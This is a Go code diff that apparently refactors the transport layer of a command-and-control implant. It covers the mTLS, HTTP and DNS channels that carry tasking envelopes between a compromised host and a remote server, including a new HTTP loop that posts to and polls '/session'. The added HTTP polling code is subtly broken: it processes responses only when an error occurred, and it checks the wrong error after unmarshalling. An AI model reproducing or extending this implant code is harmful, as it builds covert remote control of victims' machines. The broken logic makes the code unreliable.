@@ -13,6 +13,8 @@ import (
 	"strconv"
 	"sync"
 	"time"
+
+	"github.com/golang/protobuf/proto"
 )
 
 var (
@@ -40,10 +42,16 @@ var (
 type Connection struct {
 	Send    chan *pb.Envelope
 	Recv    chan *pb.Envelope
-	Ctrl    chan bool
-	Cleanup func()
+	ctrl    chan bool
+	cleanup func()
+	once    *sync.Once
 	tunnels *map[uint64]*Tunnel
 	mutex   *sync.RWMutex
+}
+
+// Cleanup - Execute cleanup once
+func (c *Connection) Cleanup() {
+	c.once.Do(c.cleanup)
 }
 
 // Tunnel - Duplex byte read/write
@@ -144,22 +152,25 @@ func mtlsConnect() (*Connection, error) {
 	connection := &Connection{
 		Send:    send,
 		Recv:    recv,
-		Ctrl:    ctrl,
+		ctrl:    ctrl,
 		tunnels: &map[uint64]*Tunnel{},
 		mutex:   &sync.RWMutex{},
-		Cleanup: func() {
+		once:    &sync.Once{},
+		cleanup: func() {
+			close(send)
 			conn.Close()
 		},
 	}
 
 	go func() {
+		defer connection.Cleanup()
 		for envelope := range send {
 			socketWriteEnvelope(conn, envelope)
 		}
 	}()
 
 	go func() {
-		defer func() { ctrl <- true }()
+		defer connection.Cleanup()
 		for {
 			envelope, err := socketReadEnvelope(conn)
 			if err == io.EOF {
@@ -188,7 +199,7 @@ func getDefaultMTLSLPort() int {
 func httpConnect() (*Connection, error) {
 
 	address := getHTTPAddress()
-	client, err := httpStartSession(address)
+	client, err := HTTPStartSession(address)
 	if err != nil {
 		return nil, err
 	}
@@ -199,13 +210,43 @@ func httpConnect() (*Connection, error) {
 	connection := &Connection{
 		Send:    send,
 		Recv:    recv,
-		Ctrl:    ctrl,
+		ctrl:    ctrl,
 		tunnels: &map[uint64]*Tunnel{},
 		mutex:   &sync.RWMutex{},
-		Cleanup: func() {
-
+		once:    &sync.Once{},
+		cleanup: func() {
+			close(send)
+			ctrl <- true
 		},
 	}
+
+	go func() {
+		defer connection.Cleanup()
+		for envelope := range send {
+			data, _ := proto.Marshal(envelope)
+			go client.Post("/session", data)
+		}
+	}()
+
+	go func() {
+		defer connection.Cleanup()
+		for {
+			select {
+			case <-ctrl:
+				return
+			default:
+				resp, err := client.Get("/session")
+				if err != nil && resp != nil {
+					envelope := &pb.Envelope{}
+					proto.Unmarshal(resp, envelope)
+					if err != nil {
+						continue
+					}
+					recv <- envelope
+				}
+			}
+		}
+	}()
 
 	return connection, nil
 }
@@ -231,27 +272,31 @@ func dnsConnect() (*Connection, error) {
 
 	send := make(chan *pb.Envelope)
 	recv := make(chan *pb.Envelope)
-	pollCtrl := make(chan bool)
 	ctrl := make(chan bool)
 	connection := &Connection{
 		Send:    send,
 		Recv:    recv,
-		Ctrl:    ctrl,
+		ctrl:    ctrl,
 		tunnels: &map[uint64]*Tunnel{},
 		mutex:   &sync.RWMutex{},
-		Cleanup: func() {
-			pollCtrl <- true // Stop polling
-			close(pollCtrl)
+		once:    &sync.Once{},
+		cleanup: func() {
+			close(send)
+			ctrl <- true // Stop polling
 		},
 	}
 
 	go func() {
+		defer connection.Cleanup()
 		for envelope := range send {
-			go dnsSessionSendEnvelope(dnsParent, sessionID, sessionKey, envelope)
+			dnsSessionSendEnvelope(dnsParent, sessionID, sessionKey, envelope)
 		}
 	}()
 
-	go dnsSessionPoll(dnsParent, sessionID, sessionKey, pollCtrl, recv)
+	go func() {
+		defer connection.Cleanup()
+		dnsSessionPoll(dnsParent, sessionID, sessionKey, ctrl, recv)
+	}()
 
 	return connection, nil
 }
